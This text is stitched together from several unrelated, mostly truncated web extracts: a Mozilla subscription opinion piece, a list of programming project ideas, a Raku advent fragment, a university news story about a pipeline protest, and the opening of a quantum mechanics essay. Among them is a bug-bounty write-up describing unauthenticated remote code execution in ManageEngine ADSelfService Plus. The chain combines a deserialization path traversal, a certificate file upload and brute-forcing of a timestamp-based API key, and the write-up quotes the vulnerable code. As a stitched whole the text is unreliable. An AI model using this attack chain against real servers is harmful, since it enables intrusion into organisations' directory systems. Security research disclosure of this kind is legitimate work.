<!--kg-card-end: markdown--><p>I've seen many people suggesting that Mozilla Corporation should abandon these smaller projects to focus exclusively on Firefox. I, however, believe that they should double down on these smaller projects.</p><h2 id="the-service-pack">The service pack</h2><p>I could see a future in which Mozilla has a bunch of freemium online services that would enhance the online experience of its users. Similarly to Pocket, they could add more features to these smaller projects and hide some of them behind a paywall.</p><p>I could also see them bundling those premium features together across products into one service pack behind the Firefox brand, effectively making a Firefox Power Pack.</p><p>Firefox, on its own, would still be free and open to everyone to use with no payment necessary, but you can optionally boost your online experience and support Firefox's development by paying for the app pack.</p><p>The biggest advantage of this approach is that they could charge more than their currently do in their B2C products. Throughout the years, I've payed $13-20/month for the services that Mozilla's already offering. If I were to switch all of those subscriptions to a brand I can get behind, I can see myself paying quite a bit for them.</p><ul><li>I'd pay $15/month right now if there was an option to do that.</li><li>I'd pay up to $25/month if they double down on this approach and offer more features across their current services.</li></ul><p>Since I can't do that today, the least I could do is re-subscribe to Pocket Premium, which I have proudly done while writing this:</p><figure><img src="https://input.sh/content/images/2020/08/Screenshot-from-2020-08-14-16-44-20.png" alt="A screenshot of me completing the signup to Pocket's Premium service." srcset="https://input.sh/content/images/size/w600/2020/08/Screenshot-from-2020-08-14-16-44-20.png 600w, https://input.sh/content/images/2020/08/Screenshot-from-2020-08-14-16-44-20.png 962w" sizes="(min-width: 720px) 720px"></figure><p>Unfortunately, the country I'm in right now is not currently supported by their other B2C products, so please Mozilla, take more of my money!</p>

<![CDATA[Personal projects ideas to improve in programming, that are also useful]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><a rel="noreferrer noopener" href="https://www.mindflash.org/coding/learn-programming/the-proper-way-to-learn-as-a-beginner-programmer-57" target="_blank" data-wpel-link="internal">Practice makes perfect</a>. I repeat it in a lot of my blog posts because of how important it is and is key to learning any programming language effectively. I think the best way to practice is by making personal projects, because they are long exercises rather than just a few functions, and they can also be a great contribution to your resume!</p>



<p>There are plenty of lists of projects to do to improve, but one thing that I never liked about them is that they always propose some generic, uninteresting and useless project that you will throw away once you are done with it. It’s already very hard to complete personal projects, so it’s a recipe for failure if you start with a personal project that you don’t care about deeply.</p>



<p>In this article I will present a list of 7 (and a half) personal projects that can help you improve at programming, or to learn a new language, but that you can also keep and develop after, because they actually bring you value outside of just programming skills.</p>



<h2>Make a personal resume website</h2>



<p>I think making a website to present your profile to potential employers is a great way to start out with personal projects. It’s a project that is easy to accomplish because theoretically it only requires HTML &amp; CSS skills. At the same time you can add a lot of technologies on top, depending on what you want to present.</p>



<p>The content to put in your website is pretty much the same as you resume: work and school experiences, a list of your skills, and a presentation of your personal projects. The advantage is that you have much more space on your website than on a one-page resume, and you can use more medium like pictures. I would also recommend adding a contact form, so that people can reach out directly.</p>



<div><figure><picture loading="lazy">
<source type="image/webp" srcset="https://www.mindflash.org/wp-content/uploads/2020/04/resume-website.jpg.webp 1000w, https://www.mindflash.org/wp-content/uploads/2020/04/resume-website-300x176.jpg.webp 300w, https://www.mindflash.org/wp-content/uploads/2020/04/resume-website-768x450.jpg.webp 768w" sizes="(max-width: 763px) 100vw, 763px">
<img loading="lazy" src="https://www.mindflash.org/wp-content/uploads/2020/04/resume-website.jpg" alt="The skills section on my own resume website" width="763" height="447" srcset="https://www.mindflash.org/wp-content/uploads/2020/04/resume-website.jpg 1000w, https://www.mindflash.org/wp-content/uploads/2020/04/resume-website-300x176.jpg 300w, https://www.mindflash.org/wp-content/uploads/2020/04/resume-website-768x450.jpg 768w" sizes="(max-width: 763px) 100vw, 763px">
</picture>
<figcaption><em>The (slightly outdated) skills section on my own resume website</em></figcaption></figure></div>



<p>Your resume website can also be the opportunity to spend some time on the graphic design aspect of it. It’s important down the line, because even if we are writing code, we are building software for people, and user experience matters. Great code that nobody uses because of a bad UI is useless.</p>



<p>You will practice <strong>HTML, CSS, UI / UX design</strong>, and potentially <strong>JavaScript</strong> and the <strong>backend </strong>programming language of your choice. You will also learn how to host a website and things related to that. Software engineering isn’t limited to coding, and you will need at least basic skills in system administration and networking in your career.</p>



<h2>Add a blog to your resume website</h2>



<p>Once your resume website is ready, or even during its development, you can go further and start building a blog. You could use WordPress, like I do for MindFlash, but if the goal is to improve your skills, a custom-made one will be better. You will also be able to integrate it better with the design of your CV website.</p>



<p>A blog is a good idea for multiple reasons:</p>



<ul><li><span>You will learn how to structure your thoughts when explaining technical aspects, which will be invaluable later for your job, when you have to write design documents, tutorials for your team, and technical documentation for your code.</span></li><li>You can build your “personal brand”. Especially if you don’t have a common name, it’s easy to rank on Google and it’ll be the first thing that people can see when they search your name,</li><li>You can share your knowledge. It’s a rewarding experience to know that some people enjoyed your teachings. I wrote a <a rel="noreferrer noopener nofollow external" href="https://medium.com/@antwaneb/catch-and-handle-all-404-errors-from-your-webservice-in-angular-5-2269b717d78f" target="_blank" data-wpel-link="external">tutorial on Medium</a> about some topic on Angular and I was ecstatic to see that someone linked it to solve a problem in a Github issue!</li></ul>



<p>For technical aspects, you will again have to deal with HTML &amp; CSS, but this time a backend programming language will be mandatory. On top of that, you will see new concepts, since you will need to use a database, and you will also have to manage permissions, with a “writer” account that is the only one allowed to post articles.</p>



<p>You could even separate the frontend and the backend, and start building a microservices infrastructure. It is overkill for a basic project, but if it fits the technologies you want to learn, it’s a good choice. For example, you can use Angular for your frontend, and it will call a backend API written in PHP with a framework.</p>



<h2>A script using the Spotify API to detect new albums of your favorite artists</h2>



<p>Back when I was around 15 years old, I made a script that called the Deezer and Spotify APIs to check all the new releases from my artists. Spotify sends emails for the major releases from artists you follow, but they don’t do it for all releases, and it’s easy to miss news albums.</p>



<p>Both platforms provide an easy to use and very complete API that you can call to get a large number of information about the data they have. You can access the documentation for the <a rel="noreferrer noopener nofollow external" href="https://developer.spotify.com/documentation/web-api/" target="_blank" data-wpel-link="external">Spotify API</a>, which will guide you through the different endpoints that you can use.</p>



<p>An example workflow for your application would be to authenticate your account, then retrieve the list of artists you follow, and finally run queries to get the list of albums they have released. The next step would be to compare this list to a database, or even just a file, to check which are the releases you haven’t heard of yet.</p>



<p>This project can take many forms, it could be a website, or just a script ran by a scheduled task, and you will have a wide range of available technologies to use.</p>



<p>Beside the programming language that you will use to make this, you will learn how to call a public API. You can explore different ways to notify you of the new albums, by sending a notification to your desktop, an email, or maybe even a <a rel="noreferrer noopener nofollow external" href="https://www.twilio.com/sms" target="_blank" data-wpel-link="external">text message</a> to your phone!</p>



<h2>A custom homepage aggregating news from your favorite sources</h2>



<p>For this one, you will be able to leverage other personal projects that you might do, or have done already, such as the Spotify “new albums notifier”. The goal is to gather all the news sources that you like in a single homepage, for your desktop, or your web browser.</p>



<p>To do that, you will have to create multiple separate modules that will handle different types of data sources, and aggregate them in a database:</p>



<ul><li><a rel="noreferrer noopener nofollow external" href="https://en.wikipedia.org/wiki/RSS" target="_blank" data-wpel-link="external"><strong>RSS feeds</strong></a>. They are XML “files” that are used a lot by blogs and other news sources, and you can subscribe to get to get notifications when a new story is published. There are plenty of open source XML parsing libraries online, so it will be the occasion to learn how to use 3rd party libraries. Actually, this blog offers an <a rel="noreferrer noopener" href="https://www.mindflash.org/feed" target="_blank" data-wpel-link="internal">RSS feed</a> with the latest articles!</li><li><strong>HTML pages</strong>. For those, you will need to manually parse (well, using a library) HTML tags to extract the information you need from the website, which means that you will need one specific module for each website to parse.</li><li><strong>APIs</strong>. Again, if you want to get your latest albums from Spotify, you would use a public API offered by the service, but many other big websites offer similar services, like Instagram or Facebook.</li></ul>



<p>Think about any of the websites you consult daily, and how you could extract those information to then feed them in your database and display them on your custom homepage.</p>



<p>This project can really be an opportunity to put in place multiple microservices, each responsible to extract one type of information and then inject it in a central database. This is a good use case for <a rel="noreferrer noopener nofollow external" href="https://aws.amazon.com/lambda/" target="_blank" data-wpel-link="external">AWS Lambdas</a> for example.</p>



<h2>A platform to track your job applications, cover letters and resumes</h2>



<p>If you are looking for a job, you will have to apply to many places. When I was looking for my end-of-studies internship 2 years ago, I applied to over 60 job offers, and that’s really not that many.</p>



<p>It can get pretty tricky to track all of those applications, and also time consuming to maintain an excel sheet, write the potential cover letters for each company, adapt your resume in some cases, and update the status of all those. For this, I suggest you create a website or a software where you can submit the companies that you applied to, a link to the job posting, and the status of those applications.</p>



<p>Then, you can go a lot further and build on top of that, a system to automatically generate for you, based on a template, a cover letter and a resume adapted to the company that you are applying for. Most of the parts of those documents will be common, but you can have a text box where you input specific details and it gets integrated into your template automatically. You could even email the recruiter automatically.</p>



<p>I think this project is a good opportunity to follow a real development process, where you will define the functionalities you want to integrate, make diagrams for the different features (you can <a rel="noreferrer noopener" href="https://www.mindflash.org/coding/quick-and-easy-uml-diagrams-with-plantuml-499" target="_blank" data-wpel-link="internal">use PlantUML to easily make UML diagrams</a>) and make sure you have an idea of what the application will look like before starting to build it.</p>



<div><figure><img loading="lazy" src="https://www.plantuml.com/plantuml/svg/PLAnRiCW5Dpv2kGnZOVk7M8vf2LAi8LHeauMTMXZoM3BnfMYjlzU9nW2BHDtx-uzTBpLe7clHza0K3Ly663Qoewh2_m2yA7GVQq-eE9IW1zmha_2bQNGv_OqM5VITKrTSLstodUEVMEDlkAFcGdPDLmB8xJ8gKBslHRDtRfkgr4AfOt8ej3gsD1AnJ3HHcBkeMtcGbFQVef-9xGMlSt34Q7TBzWUGeqIRjitTkd4DQRfOC8G9SKBpfStpD0-psX2NmtC4Tqd115cOxHk5-6jPw6v7eUv9SbOcUJv3gErQN9CCCFakTnaj4n8SKHqUPzzmEXO69njDeYM5AK87z3wHb6qHIcRm3n-7kIcksoVlkFOHXgIVcJk5wF72CPn2oCLtVyG-3jY58jGuGkkHVESV_GS4W1sMnVJEpmH060br6dQ-by0" alt="An example of UML for a application to manage resume" width="414" height="388"><figcaption><em>An quick example of UML I made for this application</em></figcaption></figure></div>



<h2>Scripts to automatize repetitive tasks</h2>



<p>A few years ago there was a story that got heavily <a rel="noreferrer noopener nofollow external" href="https://www.thejournal.ie/programmer-scripts-to-do-his-job-email-his-wife-2469028-Jan2016/" target="_blank" data-wpel-link="external">shared in the news</a> where a programmer made a bunch of scripts to automatize a few repetitive and annoying tasks. He automatized the coffee machine of his office to pour it exactly over the time he took him to reach the machine from his desk, he made a script that automatically restored a database backup when he was receiving an email from a specific customer with the word “problem” in the title, etc. You can see those scripts, amongst others, on a Github repository called <a rel="noreferrer noopener nofollow external" href="https://github.com/NARKOZ/hacker-scripts" target="_blank" data-wpel-link="external">hacker-scripts</a>.</p>



<p>I won’t say that I totally believe that this story is true, but you get the idea. You can automatize tasks to run them automatically on a schedule you decide, or on demand. Those scripts will depend heavily on what you need, but here are a few ideas:</p>



<ul><li>Bulk renaming of your pictures. If you are taking a lot of photos, it’s to rename them by date instead of using the default IMG_2042.jpg.</li><li>Automatically backup your files. Make a script that listens to a local folder and automatically uploads to Dropbox any file that you put in the folder.</li><li>Your “custom homepage” that I mentioned earlier could also be a …</li></ul></div></div>

<p>Last May, I  discovered that a critical vulnerability I had reported earlier this year had resulted in my first CVE. Since the combination of vulnerabilities that led to this unauthenticated remote code execution (RCE) was pretty fun to discover, I want to share the story about how brute force enabled me to hack into two organizations’ Active Directory-linked systems.</p>



<figure><div>

</div></figure>



<h2>The Target</h2>



<p>While performing some routine visual reconnaissance with <a href="https://github.com/michenriksen/aquatone">Aquatone</a>, I noticed a similar-looking login page on two different subdomains from unrelated bug bounty programs.</p>



<div><figure><img loading="lazy" width="1024" height="703" src="https://honoki.net/wp-content/uploads/2020/08/image-2-1024x703.png" alt="" srcset="https://honoki.net/wp-content/uploads/2020/08/image-2-1024x703.png 1024w, https://honoki.net/wp-content/uploads/2020/08/image-2-300x206.png 300w, https://honoki.net/wp-content/uploads/2020/08/image-2-768x527.png 768w, https://honoki.net/wp-content/uploads/2020/08/image-2-700x480.png 700w, https://honoki.net/wp-content/uploads/2020/08/image-2.png 1374w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Both subdomains contained customized versions of this default login screen.</figcaption></figure></div>



<p>The software behind this login screen is Zoho ManageEngine ADSelfService Plus, which offers a portal that allows users to reset the password of their own Active Directory (AD) accounts. (Anybody who has worked in a large organization will recognize why this sounds like a useful thing to have.)</p>



<p>Since I figured that any bugs I would find on this product could potentially impact multiple companies, and more so, because it sounded very likely that this is linked to the organization’s Active Directory, it seemed like a good idea to spend some time here.</p>



<p>My first efforts led to discovering a few basic reflected Cross-Site Scripting (XSS) vulnerabilities, which had apparently been identified by other researchers already. So I had to dig a little deeper. Luckily, it turned out the whole product can be downloaded and installed as a trial for 30 days.</p>



<h2>The Setup</h2>



<p>Since I was convinced there would probably be more XSS vulnerabilities to find, I decided to download and install the software with the idea of browsing through the Java source code looking for more bugs.</p>



<p>Having installed the software, I now had the advantage of being able to execute all tests locally, as well as read through the source code to understand exactly what happens in the application, and even use <code>grep</code> in the installation folder to find potentially interesting files.</p>



<div><div><div><div><p><h5>Sidenote</h5></p><div><p>To reverse engineer Java applications, I like to use <a href="https://github.com/Konloch/bytecode-viewer">Bytecode Viewer</a>, which decompiles and formats Java class files into readable Java code.

<figure><img loading="lazy" width="1024" height="643" src="https://honoki.net/wp-content/uploads/2020/08/image-3-1024x643.png" alt="" srcset="https://honoki.net/wp-content/uploads/2020/08/image-3-1024x643.png 1024w, https://honoki.net/wp-content/uploads/2020/08/image-3-300x188.png 300w, https://honoki.net/wp-content/uploads/2020/08/image-3-768x482.png 768w, https://honoki.net/wp-content/uploads/2020/08/image-3-700x439.png 700w, https://honoki.net/wp-content/uploads/2020/08/image-3.png 1501w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>I started off manually browsing through some of the Java source files without many interesting discoveries. However, I did build an understanding of the software components and how they work together. This tends to be invaluable when looking for complex bugs in applications, so was definitely worth spending a couple of hours on. As a result, I had a pretty good picture of application features, the parts of the application that consisted mostly of legacy code vs. the parts that looked more recent, the parts that had been modified to fix previous security vulnerabilities, etc.</p>



<p>At one point, I decided to build a word list of application endpoints, which could hopefully serve two purposes: to perform some “classic” security tests directly against the endpoint, and to serve as a useful resource when targeting similar applications at some point in the future.</p>



<h2>The Bugs</h2>



<h4>1. Insecure deserialization in Java</h4>



<p>During my enumeration of the application’s endpoints, I spotted the following lines in one of the <code>web.xml</code> files:</p>



<pre data-enlighter-language="xml" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">&lt;servlet-mapping&gt;
&lt;servlet-name&gt;CewolfServlet&lt;/servlet-name&gt;
&lt;url-pattern&gt;/cewolf/*&lt;/url-pattern&gt;
&lt;/servlet-mapping&gt;</pre>



<p>When I googled that, I found <a href="https://www.exploit-db.com/exploits/48176">a published RCE against a <code>cewolf</code> endpoint</a> on another ManageEngine product, using a path traversal in the <code>img</code> parameter – this looked very promising!</p>



<p>Sure enough, after manually placing a file in a folder on my local installation, I could confirm that the deserialization vulnerability also existed in this version of ADSelfService Plus by browsing to <code>http://localhost:8888/cewolf/?img=/../../../path/to/evil.file</code></p>



<p>This meant I had a ready-to-use Java deserialization vulnerability on the targeted sites, but I would only be able to exploit it if I found a way to upload arbitrary files to the server first. So the work wasn’t quite done yet.</p>



<h4>2. Arbitrary file upload</h4>



<p>Finding an arbitrary file upload vulnerability did not look like an easy challenge. To maximize my attack surface, I continued to configure the software on my machine, which required setting up a local Domain Controller and an Active Directory domain to play with.</p>



<p>Fast forward through hours of downloading ISOs, making space on HDDs, VMware Workstation shenanigans, Microsoft Windows Server administration and watching Youtube videos with titles like “<a href="https://www.youtube.com/watch?v=pRf_uU0vrMM&amp;t=773s">How to Set Up a Windows Server 2019 Domain Controller</a>“, and I finally had a setup that allowed me to log in to the admin panel.</p>



<div><figure><img loading="lazy" width="1024" height="445" src="https://honoki.net/wp-content/uploads/2020/08/image-13-1024x445.png" alt="" srcset="https://honoki.net/wp-content/uploads/2020/08/image-13-1024x445.png 1024w, https://honoki.net/wp-content/uploads/2020/08/image-13-300x130.png 300w, https://honoki.net/wp-content/uploads/2020/08/image-13-768x334.png 768w, https://honoki.net/wp-content/uploads/2020/08/image-13-700x304.png 700w, https://honoki.net/wp-content/uploads/2020/08/image-13.png 1469w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>I finally set up a working copy of ADSelfService Plus, time to hack.</figcaption></figure></div>



<p>With full admin access to the application, I could now further map out application features and API endpoints. For obvious reasons, I spent most of my time investigating all different upload features in the application, until I came across one feature that supported uploading a smartcard certificate configuration, resulting in a POST request to <code>/LogonCustomization.do?form=smartCard&amp;operation=Add</code></p>



<p>When I noticed that the uploaded certificate file was stored on the server’s file system without modifying the name, I figured that this might be the way forward to leverage the deserialization bug! So I traced this API call through the source code to find out more about possible ways to attack this.</p>



<p>On a high level, this is how that worked:</p>



<figure><img loading="lazy" width="888" height="410" src="https://honoki.net/wp-content/uploads/2020/08/image-12.png" alt="" srcset="https://honoki.net/wp-content/uploads/2020/08/image-12.png 888w, https://honoki.net/wp-content/uploads/2020/08/image-12-300x139.png 300w, https://honoki.net/wp-content/uploads/2020/08/image-12-768x355.png 768w, https://honoki.net/wp-content/uploads/2020/08/image-12-700x323.png 700w" sizes="(max-width: 888px) 100vw, 888px"></figure>







<ol><li>A logged-in administrator can upload a smartcard configuration to <code>/LogonCustomization.do?form=smartCard&amp;operation=Add</code>;</li><li>This triggers a backend request to the server’s authenticated RestAPI on <code>/RestAPI/WC/SmartCard?HANDSHAKE_KEY=secret</code> using a secret handshake that is generated on the server side;</li><li>Before executing the requested action, the <code>HANDSHAKE_KEY</code> is validated against a second API endpoint on <code>/servlet/HSKeyAuthenticator?PRODUCT_NAME=ManageEngine+ADSelfService+Plus&amp;HANDSHAKE_KEY=secret</code> which returns <code>SUCCESS</code> or <code>FAILED</code> depending on the passed <code>secret</code>;</li><li>If successful, the uploaded certificate is written to <code>C:\ManageEngine\ADSelfService Plus\bin</code></li></ol>



<p>Interestingly, the <code>/RestAPI</code> endpoint was publicly accessible, so any request with a valid <code>HANDSHAKE_KEY</code> would bypass user authentication and be processed by the server.</p>



<p>Furthermore, the <code>/servlet/HSKeyAuthenticator</code> was also publicly accessible, allowing an unauthorized user to manually verify if an authentication secret was valid or not.</p>



<p>With this in mind, I returned to the now familiar source code.</p>



<h4>3. Bruteforceable authentication key </h4>



<p>I identified two interesting Java classes with some help from <code>grep</code>, and from my installation’s PostgreSQL database that contained a useful inventory of API endpoints and their authentication needs:</p>



<div><figure><img loading="lazy" width="711" height="459" src="https://honoki.net/wp-content/uploads/2020/08/image-10.png" alt="" srcset="https://honoki.net/wp-content/uploads/2020/08/image-10.png 711w, https://honoki.net/wp-content/uploads/2020/08/image-10-300x194.png 300w, https://honoki.net/wp-content/uploads/2020/08/image-10-700x452.png 700w" sizes="(max-width: 711px) 100vw, 711px"><figcaption>Another benefit to local installations of software is full access to the underlying database.</figcaption></figure></div>



<p>A snippet from <code>HSKeyAuthenticator.class</code> in <code>com.manageengine.ads.fw.servlet</code>:</p>



<pre data-enlighter-language="java" data-enlighter-theme="" data-enlighter-highlight="5-8" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
      try {
         String message = "FAILED";
         RestAPIKey.getInstance();
         String apiKey = RestAPIKey.getKey();
         String handShakeKey = request.getParameter("HANDSHAKE_KEY");
         if (handShakeKey.equals(apiKey)) {
            message = "SUCCESS";
         }

         PrintWriter out = response.getWriter();
         response.setContentType("text/html");
         out.println(message);
         out.close();
      } catch (Exception var7) {
         HSKeyAuthenticator.out.log(Level.INFO, " ", var7);
      }

   }
</pre>



<p>And one from <code>RestAPIKey.class</code> in <code>package com.manageengine.ads.fw.api</code>:</p>



<pre data-enlighter-language="java" data-enlighter-theme="" data-enlighter-highlight="3-4,11,13" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">  public static void generateKey()
  {
    Long cT = Long.valueOf(System.currentTimeMillis());
    key = cT.toString();
    generatedTime = cT;
  }

  public static String getKey()
  {
    Long cT = Long.valueOf(System.currentTimeMillis());
    if ((key == null) || (generatedTime.longValue() + 120000L &lt; cT.longValue()))
    {
      generateKey();
    }
    return key;
  }
</pre>



<p>As you can see from those pieces of code, the API authentication key of the server is set to the current time in milliseconds and has a lifespan of 2 minutes. This means that at any given moment, there are 120 000 possible authentication keys (120 seconds * 1000 milliseconds/second).</p>



<p>In other words, if I could generate at least 1000 requests per second consistently over a time span of 2 minutes, I would have a guaranteed hit at the moment the authentication key expired and regenerated. While that seems like a large number for a network-level attack, a successful attack is not necessarily beyond the realm of possibility. Especially keeping in mind that even at a lower than 100% success rate, and given sufficient time, a successful hit becomes more and more likely.</p>



<p>In practice, I quickly had a working proof-of-concept that would brute force my local instance’s secret in a matter of minutes.</p>



<div><figure><img loading="lazy" width="1024" height="564" src="https://honoki.net/wp-content/uploads/2020/08/image-6-1024x564.png" alt="" srcset="https://honoki.net/wp-content/uploads/2020/08/image-6-1024x564.png 1024w, https://honoki.net/wp-content/uploads/2020/08/image-6-300x165.png 300w, https://honoki.net/wp-content/uploads/2020/08/image-6-768x423.png 768w, https://honoki.net/wp-content/uploads/2020/08/image-6-700x385.png 700w, https://honoki.net/wp-content/uploads/2020/08/image-6.png 1279w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Brute forcing the secret on my local instance worked a charm.</figcaption></figure></div>



<p>However, when employing the script against a live target (i.e. over an <em>actual</em> internet connection), I wasn’t as lucky. I ran and reran the script with different configurations and settings for hours, and overnight without result, and was starting to fear my approach would have to be abandoned.</p>



<p>Furthermore, I got temporarily sidetracked because I wasn’t sure what time zone my target servers were running in. I ended up rerunning my script with multiple offsets from my own (CET) until I found out that Java’s <code><a href="https://docs.oracle.com/javase/7/docs/api/java/lang/System.html#currentTimeMillis()">currentTimeMillis</a></code> apparently returns time in Coordinated Universal Time (UTC), and I needn’t have bothered.</p>



<p>Eventually, after more trial and …</p></div></div>

<h3>Break someone’s code today!</h3><p>On September 1st of 2000 Damian Conway sent a proposal №188, promoting the idea of Private Keys and Methods.</p><p>In those days, Perl’s object-oriented programming relied heavily on hashes. Indeed, a hash can store data values by keys, as well as  references to routines, which is how you can describe an object with data attributes and methods. With bits of syntax sugar here and there one can make shortcuts to work with such an object’s state and behavior.</p><p>So can be done in Raku nowadays:</p><pre id="advent-code-fdb55dec-8cdf-4465-89e6-a64a01297843"><table>

It gives you means to divide your coding efforts into a couple of different realms, one of which has “Nobody but I can use this” policy and its opposite takes the famous “Use it as you please and we will try really, really hard not to break anything knowingly” stance.</p><p>While encapsulation by itself is not a Great Code Problems Solver (you can write scary code anyways!) nor it reduces the amount of bugs (as if it happens!), but it certainly can save you some nerves during rewriting code (which sometimes is a Great Way To Solve Problems) and reduces coupling between components (which does reduce the amount of bugs, right? Hope never dies).</p><p>Here, inspired by the <code>Tie::SecureHash</code> module approach, Damian Conway has proposed a way to support encapsulation in a hash-based object-y system.</p><h3>Sugar – the keyword way</h3><p>The proposal describes a unary function named <code>private</code>, which can be applied to a single hash entry, a slice of entries or a whole hash:</p><pre id="advent-code-922ff4d7-0f96-4ebf-b620-d3383d9fe9e7"><table>

<p><b>By Diane Luckow</b></p>
<p>SFU health sciences professor and retired physician Dr. Tim Takaro, 63, has just returned to the ground after 10 days of camping in the treetops alongside the Brunette River near Hume Park in New Westminster, B.C.</p>
<p>He and his supporters are trying to stop the contentious Trans Mountain Pipeline expansion project, which will carry three times more bitumen from Alberta to Burnaby, B.C. than the present pipeline. &nbsp;The expansion plans call for the trees along the Brunette River conservation area to be felled by Sept. 15.</p>
<p>He is protesting the pipeline because he says, “the review process was rigged since it was approved with no regard for the climate impacts of the oil flowing to foreign markets.”</p>
<p>He wants the Canadian government to stop building large fossil energy projects and instead invest in sustainable, renewable energy projects.</p>
<p>Much of Takaro’s research has focused on climate change and human health, with an emphasis on water quality in B.C. communities and the effects of cumulative exposures related to resource extraction.</p>
<p>“The climate risks of burning the fuel that will be transported by this pipeline were not considered,” says Takaro, who participated in the pipeline review process. He wrote two extensive reports, participated in all of the hearings, and even convinced B.C. health officers, more than a year ago, to demand an independent assessment of the cumulative health impacts.</p>
<p>Takaro says the health risks are many, including leukemia in children, air pollution and, in the event of a spill, contaminated water supplies and the mental health impacts from dealing with the disaster.</p>
<p>“All of that was ignored,” he says, “so there comes a time when, as a public health physician, my duty is to protect public health.”</p>
<p>SFU supporters include health sciences professor Scott Venners, who animated a video to help spread the word about Takaro’s protest on social media.</p>
<p>Takaro also had visits from health sciences professor Ryan Allen, who dropped by and was interviewed by City News 1130, and former health sciences dean John O’Neil, who dropped by with supplies. Also visiting were current dean Tania Bubela, who tweeted about Takaro’s sit-in and Mark Lechner who handled crucial logistics.</p>
<p>A group of other supporters camped nearby to assist him throughout the days and evenings. Science communicator Kurtis Baute has now replaced him in the treetop campsite.</p>
<p>“COVID-19 has shown us that we can respond to a health emergency with incredible strength by citizens and government,” says Takaro. “We are transforming our world at work in school and in our economic priorities. We’ve known that we must transform our energy system for decades and now is the time to bounce back better from COVID-19 by phasing out fossil energy sources. The Prime Minister’s new pipeline, which has a 40- to 50-year lifespan, will enable expansion of the Alberta oilsands.</p>
<p>“This is not in the national interest and will harm the planet. Future generations depend upon us to do the right thing now, and spend our money on the future not the past.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="EssayContents"><div id="EssayContentsInner"><div><blockquote><em>Quantum mechanics: real black magic calculus.</em><p>— Albert Einstein, writing to a colleague in 1925</p></blockquote><p>In fairy tales, a wizard will say the magic words of a spell, or inscribe a set of magic symbols, and the world will change. Fireballs shoot from their hands; the hero is revived from an endless slumber; a couple falls in love. We smile when we hear such stories. They seem quaint but implausible. Common sense tells us that merely speaking certain words, or inscribing certain symbols, cannot cause such changes in the world. And yet our scientific theories are not so different. By speaking the words or inscribing the symbols of such a theory, we can greatly deepen our understanding of the world. That new understanding then enables us to change the world in ways that formerly seemed impossible, even inconceivable. Consider quantum mechanics, one of our deepest theories. It has helped us create lasers, semiconductor chips, and magnetic resonance imaging. One day it will likely help us create quantum computers, perhaps even quantum intelligences. Quantum mechanics is magic that actually works.</p><p>In this essay, we explain quantum mechanics in detail. We will describe all the principles of quantum mechanics in depth, nothing held back. It's not a handy-wavy treatment, of the kind often found in articles written for a general audience. While such articles can be entertaining, trying to learn quantum mechanics by reading them is like learning to play basketball by merely watching basketball being played. This essay will get you out on the mathematical court of quantum mechanics. Of course, you won't learn to slam dunk, at least not yet. But the essay will ground you in an understanding of the fundamentals of quantum mechanics, which you can later build upon and extend.</p><p>To read the essay, you must first understand the quantum circuit model of quantum computation. If you're not familiar with quantum circuits, you can learn about them from our earlier essay, <a href="https://quantum.country/qcvc">Quantum Computing for the Very Curious</a>. You may wish to pause to read that essay now, if you haven't already. Once you've understood that material you shouldn't need any other prerequisites. Indeed, when you learned quantum computing, you learned in passing almost all of quantum mechanics. In <a href="#postulates">Part I</a> of this essay we distill those past ideas, collecting them up into the package known as quantum mechanics.</p><p>Although quantum mechanics is not so difficult to learn, it's a theory which has disturbed many people. Here's a few classic quotes on this puzzlement:</p><blockquote><p><em>I think I can safely say that nobody understands quantum mechanics … Do not keep saying to yourself, if you can possibly avoid it, “But how can it be like that?” because you will get “down the drain”, into a blind alley from which nobody has yet escaped. Nobody knows how it can be like that. </em>– Richard Feynman</p><p><em>I have thought a hundred times as much about the quantum problems as I have about general relativity theory.</em> – Albert Einstein</p><p><em>If quantum mechanics hasn't profoundly shocked you, you haven't understood it yet.</em> – Niels Bohr</p></blockquote><p>If quantum mechanics is not so difficult to learn, why has it so disturbed many great physicists? What do they mean when they say they don't understand it, or are shocked by it? How can a scientific theory be both beautiful and disturbing? In <a href="#trouble-with-qm">Part II</a> of this essay we'll explore these questions. As we'll see, despite its simplicity quantum mechanics raises striking conceptual problems, problems which are among the most exciting open problems in science today.</p><p>The essay is presented in an unusual form. It's an example of what we call a <em>mnemonic essay</em>, written in the <em>mnemonic medium</em>. That means it incorporates new user interface elements intended to make it almost effortless for you to remember and apply the ideas in the essay. The motivator is that most people (ourselves included) quickly forget much of what we read in books and articles. The mnemonic medium takes advantage of what cognitive scientists know about how humans learn, creating an interface which ensures you'll remember the ideas and how to apply them near permanently. More on how that works below.</p><p>So, what is quantum mechanics? It's fun to wax poetic about it being magic that actually works, or to quote eminent scientists saying no-one really understands it. But while fun, those statements give no direct enlightenment. What is quantum mechanics, really?</p><p>Quantum mechanics is simply this: it's a set of four postulates that provide a mathematical framework for describing the universe and everything in it. These postulates reflect ideas you've already seen in the quantum circuit model: how to describe a quantum state; how to describe the dynamics of a quantum system; and so on. But rather than talk abstractly, it's better to just see the first postulate:</p><h2 id="first-postulate-qm">The first postulate: state space</h2><blockquote><strong>Postulate 1:</strong> Associated to any physical system is a complex vector space known as the <em>state space</em> of the system. If the system is isolated, then the system is completely described by its <em>state vector</em>, which is a unit vector in the system's state space.</blockquote><p>This may seem densely written, but you already know most of it. In particular, we've been working extensively with qubits, and we've seen this postulate in action. For a qubit the state space is, as you know, a two-dimensional complex vector space. The state is a unit vector in that state space (i.e., has length <span><span><span><span><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span></span>)</span>. And the condition that the state vector is a unit vector expresses the idea that the probabilities for the outcomes of a computational basis measurement add up to <span><span><span><span><math><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span></span>.</span></p><p>It's not just qubits that have a state space. The first postulate of quantum mechanics tells us that <em>every</em> physical system has a state space. An atom has a state space; a human being has a state space; even the universe as a whole has 